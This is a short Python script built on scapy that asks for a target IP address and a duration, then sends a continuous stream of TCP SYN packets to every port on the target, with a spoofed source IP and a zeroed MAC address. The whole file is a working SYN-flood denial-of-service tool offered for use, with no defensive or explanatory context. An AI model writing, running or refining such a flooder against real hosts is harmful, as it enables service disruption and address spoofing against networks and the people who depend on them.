from scapy.all import *
import time
from multiprocessing import Process

def hit(target,duration):
    starttime=time.time()
    currentTime=time.time()
    p=0
    while(currentTime-starttime <= duration):
        currentTime=time.time()
        p+=1
        packet = Ether(src="00:00:00:00:00:00")/(IP(src="1.1.1.1",dst=target)/TCP(dport=p,flags="S"))/"102910"
        sendp(packet, iface='Wi-Fi')
        if(p >= 65535):
            p=0

if __name__ == '__main__':
    target = input("Target IP:")
    duration = int(input("How many seconds:"))
    p = Process(target=hit, args=(target,duration))
    p.start()
    p.join()
